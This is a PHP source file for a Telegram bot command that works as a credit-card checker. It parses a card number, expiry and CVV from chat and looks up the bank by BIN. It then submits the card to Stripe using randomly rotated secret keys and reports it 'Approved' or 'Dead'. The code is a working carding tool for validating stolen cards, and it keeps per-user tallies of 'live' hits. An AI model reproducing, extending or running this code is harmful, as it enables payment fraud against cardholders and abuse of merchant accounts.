<?php
/*
========================================
 Stripe Multi Merchant Command
 /sm creditcard
========================================
*/

/* ===== BASE PATH ===== */
$base = dirname(__DIR__, 2);

/* ===== INCLUDES ===== */
require_once $base . '/config/config.php';
require_once $base . '/config/variables.php';
require_once $base . '/functions/bot.php';
require_once $base . '/functions/db.php';
require_once $base . '/functions/functions.php';


/* ===== COMMAND ===== */
if (strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0) {

    $antispam = antispamCheck($userId);
    addUser($userId);

    if ($antispam !== false) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);
        return;
    }

    /* ===== WAIT MESSAGE ===== */
    $msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "<b>Wait for Result...</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);

    $messageidtoedit = $msg->result->message_id ?? null;

    $lista = substr($message, 4);

    /* ===== CC REGEX ===== */
    if (!preg_match(
        "/(\d{16})[\/\s:|]*(\d{2})[\/\s|]*(\d{2,4})[\/\s|-]*(\d{3})/",
        $lista,
        $m
    )) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>Provide a valid CC to check.</b>",
            'parse_mode' => 'html'
        ]);
        return;
    }

    /* ===== CC DATA ===== */
    $cc   = $m[1];
    $mon  = $m[2];
    $year = $m[3];
    $cvv  = $m[4];
    $bin  = substr($cc, 0, 6);

    /* ===== RANDOM SK ===== */
    $sk = $config['sk_keys'];
    shuffle($sk);
    $sec = $sk[0];

    /* ===== BIN LOOKUP ===== */
    $ch = curl_init("https://lookup.binlist.net/$bin");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERAGENT => "Mozilla/5.0"
    ]);
    $binData = curl_exec($ch);
    curl_close($ch);

    $bank     = capture($binData, '"bank":{"name":"', '"') ?: "Unavailable";
    $scheme   = ucfirst(capture($binData, '"scheme":"', '"') ?: "Unavailable");
    $type     = ucfirst(capture($binData, '"type":"', '"') ?: "Unavailable");
    $country  = capture($binData, '"country":{"name":"', '"') ?: "Unavailable";
    $emoji    = capture($binData, '"emoji":"', '"') ?: "";
    $currency = capture($binData, '"currency":"', '"') ?: "Unavailable";
    $phone    = capture($binData, '"phone":"', '"') ?: "Unavailable";

    /* ===== STRIPE SOURCE ===== */
    $ch = curl_init("https://api.stripe.com/v1/sources");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERPWD => $sec . ":",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS =>
            "type=card&card[number]=$cc&card[exp_month]=$mon&card[exp_year]=$year&card[cvc]=$cvv",
    ]);
    $result = curl_exec($ch);
    curl_close($ch);

    if (strpos($result, '"error"') !== false) {
        $err = capture($result, '"message":"', '"');
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'parse_mode' => 'html',
            'text' => "
<b>Card:</b> <code>$cc|$mon|$year|$cvv</code>
<b>Status:</b> Dead ❌
<b>Response:</b> <code>$err</code>
<b>Gateway:</b> Stripe Auth 1
"
        ]);
        return;
    }

    $sourceId = capture($result, '"id":"', '"');

    /* ===== STRIPE CUSTOMER ===== */
    $start = microtime(true);

    $ch = curl_init("https://api.stripe.com/v1/customers");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERPWD => $sec . ":",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "source=$sourceId"
    ]);
    $result2 = curl_exec($ch);
    curl_close($ch);

    $time = round(microtime(true) - $start, 2);

    /* ===== RESULT ===== */
    if (array_in_string($result2, $live_array)) {
        $response = trim(strip_tags(capture($result2, '"message":"', '"')));
        $live = true;
    } elseif (strpos($result2, '"cvc_check":"unavailable"') !== false) {
        $response = "CVC Check Unavailable";
        $live = false;
    } else {
        $response = capture($result2, '"decline_code":"', '"') ?: "Declined";
        $live = false;
    }

    /* ===== STATS ===== */
    addTotal();
    addUserTotal($userId);

    if ($live) {
        addCCN();
        addUserCCN($userId);
        addCVV();
        addUserCVV($userId);
    }

    /* ===== FINAL MESSAGE ===== */
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'parse_mode' => 'html',
        'disable_web_page_preview' => true,
        'text' => "
<b>Card:</b> <code>$cc|$mon|$year|$cvv</code>
<b>Status:</b> " . ($live ? "Approved ✅" : "Dead ❌") . "
<b>Response:</b> <code>$response</code>
<b>Gateway:</b> Stripe Auth 1
<b>Time:</b> {$time}s

<b>Bank:</b> $bank
<b>Brand:</b> $scheme
<b>Type:</b> $type
<b>Country:</b> $country $emoji
<b>Currency:</b> $currency
<b>Phone:</b> $phone

<b>Checked By:</b> <a href='tg://user?id=$userId'>$firstname</a>
"
    ]);
}
